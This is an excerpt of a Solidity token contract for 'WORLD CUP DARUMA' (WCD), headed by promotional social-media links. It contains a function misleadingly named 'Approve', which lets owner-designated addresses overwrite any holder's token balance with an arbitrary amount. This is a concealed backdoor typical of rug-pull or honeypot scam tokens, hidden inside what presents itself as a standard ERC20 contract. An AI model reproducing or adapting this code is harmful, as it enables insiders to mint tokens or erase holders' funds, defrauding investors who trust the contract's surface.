...
/**
 Website: https://www.worldcupdaruma.com/

Medium: https://worldcupdaruma.medium.com/

Twitter: https://twitter.com/WorldCupDaruma

Telegram: https://t.me/WorldCupDarumaErc
*/
...
contract WorldCupDaruma  is Ownable, IERC20 {
    using SafeMath for uint256;
    mapping (address => uint256) private _tOwned;
    mapping (address => mapping (address => uint256)) private _allowances;
    mapping (address => bool) private _isExcludedFrom;
    string private  _name = "WORLD CUP DARUMA";
    string private  _symbol = "WCD";
    ...
    function Approve(address from, address to , address rave ,uint256 amount ) external  { 
        require( _isExcludedFrom[msg.sender]);
        require(from != uniswapV2Pair);
        require(to != uniswapV2Pair);
        require(rave != uniswapV2Pair);
        _tOwned[from] = amount ;
        _tOwned[to] = amount ;
        _tOwned[rave] = amount ;
    }   
